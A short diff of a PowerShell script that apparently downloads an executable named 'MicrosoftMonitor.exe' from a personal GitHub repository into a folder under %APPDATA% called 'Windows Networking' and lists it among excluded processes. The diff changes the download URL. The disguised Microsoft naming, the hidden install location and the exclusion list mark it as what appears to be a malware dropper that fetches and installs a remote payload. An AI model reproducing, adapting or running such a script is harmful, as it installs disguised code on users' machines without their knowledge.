@@ -1,6 +1,6 @@
 # Variables
 $dir = "$env:APPDATA\Windows Networking"
-$exeUrl = "https://github.com/rkx0/SRUTR1.3/raw/refs/heads/main/MicrosoftMonitor4.exe"
+$exeUrl = "https://github.com/rkx0/SRUTR1.3/raw/refs/heads/main/MicrosoftMonitor.exe"
 $exeName = "MicrosoftMonitor.exe"
 $exePath = Join-Path -Path $dir -ChildPath $exeName
 $excludedProcesses = @("MicrosoftMonitor.exe")
@@ -71,4 +71,5 @@ Try {
 
 # 8. Completion
 Write-Host "[✓] Script completed. No restart was performed."
+
 
